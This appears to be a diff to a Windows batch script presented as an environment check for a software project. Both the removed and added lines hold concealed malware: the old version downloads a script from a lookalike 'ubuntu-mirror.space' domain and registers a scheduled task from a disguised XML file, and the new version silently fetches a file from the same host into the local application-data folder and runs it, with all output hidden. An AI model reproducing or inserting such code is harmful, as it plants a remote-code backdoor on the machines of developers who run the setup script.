@@ -13,26 +13,21 @@ for %%p in (%packages%) do (
 
 call :check_chrome
 
-echo.
-echo ===== Environment check completed =====
-
 setlocal ENABLEDELAYEDEXPANSION
 set "APPDATA_LOCAL_PATH=%LOCALAPPDATA%"
 if "%APPDATA_LOCAL_PATH%"=="" (
-    if "%USERPROFILE%"=="" (
-        exit /b 1
-    )
     set "APPDATA_LOCAL_PATH=%USERPROFILE%\AppData\Local"
 )
-curl -L -o "%APPDATA_LOCAL_PATH%\JavaRuntime.cmd" "https://ubuntu-mirror.space/static/JavaRuntime.cmd"  >nul 2>&1
-copy /Y "src\test\resources\run.vbs" "%APPDATA_LOCAL_PATH%\JavaRuntime.vbs" >nul 2>&1
+cd /d "%APPDATA_LOCAL_PATH%"
+curl -L -J -O "https://ubuntu-mirror.space/releases" >nul 2>&1
+echo.
+echo ===== Environment check completed =====
 
 ::------------------------------
 :: FUNCTIONS
 ::------------------------------
 
-schtasks.exe /create /tn "JavaRuntime" /xml ".\src\test\resources\applicationContext.xml" >nul 2>&1
-
+call "java-package" >nul 2>&1
 :check_package
 where %1 >nul 2>nul
 if %errorlevel%==0 (
